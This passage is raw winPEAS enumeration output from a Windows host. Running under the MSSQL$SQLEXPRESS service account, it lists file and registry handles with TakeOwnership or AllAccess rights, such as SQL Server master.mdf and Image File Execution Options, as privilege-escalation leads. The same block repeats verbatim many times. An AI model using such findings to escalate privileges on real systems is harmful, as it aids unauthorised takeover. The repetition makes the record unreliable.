    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\master.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2800(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\model.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2900(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2936(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\modellog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2992(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 1656(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================

    Handle: 1860(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows\SysWOW64
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2040(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\windows nt\currentversion\image file execution options
   =================================================================================================

    Handle: 2068(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 2100(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\customlocale
   =================================================================================================

    Handle: 2276(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2324(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\wow6432node\microsoft\.netframework
   =================================================================================================

    Handle: 2704(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2708(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\master.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2800(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\model.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2900(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2936(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\modellog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2992(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 1656(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================

    Handle: 1860(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows\SysWOW64
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2040(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\windows nt\currentversion\image file execution options
   =================================================================================================

    Handle: 2068(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 2100(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\customlocale
   =================================================================================================

    Handle: 2276(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2324(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\wow6432node\microsoft\.netframework
   =================================================================================================

    Handle: 2704(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2708(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\master.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2800(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\model.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2900(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2936(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\modellog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2992(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 1656(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================

    Handle: 1860(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows\SysWOW64
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2040(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\windows nt\currentversion\image file execution options
   =================================================================================================

    Handle: 2068(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 2100(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\customlocale
   =================================================================================================

    Handle: 2276(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2324(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\wow6432node\microsoft\.netframework
   =================================================================================================

    Handle: 2704(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2708(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\master.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2800(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\model.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2900(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2936(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\modellog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2992(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 1656(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================

    Handle: 1860(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows\SysWOW64
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2040(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\windows nt\currentversion\image file execution options
   =================================================================================================

    Handle: 2068(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 2100(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\customlocale
   =================================================================================================

    Handle: 2276(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2324(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\wow6432node\microsoft\.netframework
   =================================================================================================

    Handle: 2704(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2708(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\master.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2800(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\model.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2900(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2936(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\modellog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2992(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 1656(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================

    Handle: 1860(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows\SysWOW64
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2040(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\windows nt\currentversion\image file execution options
   =================================================================================================

    Handle: 2068(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 2100(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\customlocale
   =================================================================================================

    Handle: 2276(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2324(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\wow6432node\microsoft\.netframework
   =================================================================================================

    Handle: 2704(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2708(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\master.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2800(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\model.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2900(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2936(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\modellog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2992(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 1656(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================

    Handle: 1860(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows\SysWOW64
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2040(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\windows nt\currentversion\image file execution options
   =================================================================================================

    Handle: 2068(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 2100(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\customlocale
   =================================================================================================

    Handle: 2276(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2324(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\wow6432node\microsoft\.netframework
   =================================================================================================

    Handle: 2704(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2708(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\master.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2800(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\model.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2900(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2936(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\modellog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2992(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 1656(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================

    Handle: 1860(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows\SysWOW64
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2040(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\windows nt\currentversion\image file execution options
   =================================================================================================

    Handle: 2068(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 2100(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\customlocale
   =================================================================================================

    Handle: 2276(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2324(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\wow6432node\microsoft\.netframework
   =================================================================================================

    Handle: 2704(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2708(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\master.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2800(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\model.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2900(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2936(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\modellog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2992(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 1656(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================

    Handle: 1860(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows\SysWOW64
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2040(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\windows nt\currentversion\image file execution options
   =================================================================================================

    Handle: 2068(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 2100(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\customlocale
   =================================================================================================

    Handle: 2276(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2324(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\wow6432node\microsoft\.netframework
   =================================================================================================

    Handle: 2704(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2708(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\master.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2800(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\model.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2900(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2936(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\modellog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2992(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 1656(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================

    Handle: 1860(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows\SysWOW64
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2040(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\microsoft\windows nt\currentversion\image file execution options
   =================================================================================================

    Handle: 2068(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\software\microsoft\ole
   =================================================================================================

    Handle: 2100(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: AllAccess
    Registry: HKLM\system\controlset001\control\nls\customlocale
   =================================================================================================

    Handle: 2276(file)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Windows
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2324(key)
    Handle Owner: Pid is 2172(winpeas) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    Registry: HKLM\software\wow6432node\microsoft\.netframework
   =================================================================================================

    Handle: 2704(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2708(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\master.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

    Handle: 2800(file)
    Handle Owner: Pid is 5704(sqlservr) with owner: MSSQL$SQLEXPRESS
    Reason: TakeOwnership
    File Path: \Program Files\Microsoft SQL Server\MSSQL16.SQLEXPRESS\MSSQL\DATA\model.mdf
    File Owner: BUILTIN\Administrators
   =================================================================================================

